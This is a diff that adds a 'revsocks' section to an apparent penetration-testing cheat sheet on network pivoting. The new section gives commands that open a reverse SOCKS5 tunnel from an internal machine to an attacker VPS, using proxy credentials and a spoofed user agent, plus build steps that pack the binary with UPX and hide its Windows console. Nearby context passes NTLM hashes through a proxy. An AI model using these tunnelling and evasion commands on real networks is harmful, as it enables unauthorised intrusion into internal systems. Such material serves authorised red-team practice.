@@ -13,6 +13,7 @@
 * [sshuttle](#sshuttle)
 * [chisel](#chisel)
 * [Rpivot](#rpivot)
+* [RevSocks](#revsocks)
 * [plink](#plink)
 * [ngrok](#ngrok)
 * [Basic Pivoting Types](#basic-pivoting-types)
@@ -191,6 +192,38 @@ python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [pro
 --ntlm-proxy-port 8080 --domain CORP --username jdoe \
 --hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE
 ```
+
+## revsocks
+
+```powershell
+# Listen on the server and create a SOCKS 5 proxy on port 1080
+user@VPS$ ./revsocks -listen :8443 -socks 127.0.0.1:1080 -pass Password1234
+
+# Connect client to the server
+user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234
+user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 -proxy proxy.domain.local:3128 -proxyauth Domain/userpame:userpass -useragent "Mozilla 5.0/IE Windows 10"
+```
+
+
+```powershell
+# Build for Linux
+git clone https://github.com/kost/revsocks
+export GOPATH=~/go
+go get github.com/hashicorp/yamux
+go get github.com/armon/go-socks5
+go get github.com/kost/go-ntlmssp
+go build
+go build -ldflags="-s -w" && upx --brute revsocks
+
+# Build for Windows
+go get github.com/hashicorp/yamux
+go get github.com/armon/go-socks5
+go get github.com/kost/go-ntlmssp
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
+go build -ldflags -H=windowsgui
+upx revsocks
+```
+
 
 ## plink
 
